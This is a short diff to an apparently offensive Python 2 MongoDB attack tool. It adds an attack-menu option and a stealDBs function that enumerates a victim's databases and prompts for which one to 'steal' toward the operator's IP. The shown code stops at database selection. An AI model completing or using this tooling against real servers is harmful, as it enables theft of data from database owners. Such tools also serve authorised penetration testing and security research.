@@ -40,10 +40,37 @@ def netAttacks(target, dbPort, myIP, myPort):
             if attack == '1':
                 print "\n"
                 getPlatInfo(conn)
+            if attack == '4':
+                print "\n"
+                if myIP == "NOT SET":
+                    print "Target database not set"
+                else:
+                    stealDBs(myIP,target,conn)
+
+
+
             elif attack == '6':
                 return
 
 
+
+def stealDBs(myDBIP,victim,mongoConn):
+    dbList = mongoConn.database_names()
+    dbLoot = True
+    menuItem = 1
+
+    if len(dbList) == 0:
+        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
+        return
+    for dbname in dbList:
+        print str(menuItem) + "_" + dbname
+        menuItem += 1
+    while dbLoot:
+        dbLoot = raw_input("Select a database to steal:")
+        if int(dbLoot) >= menuItem:
+            print "Invalid selection."
+        else:
+            break
 
 
 def getPlatInfo (mongoConn):
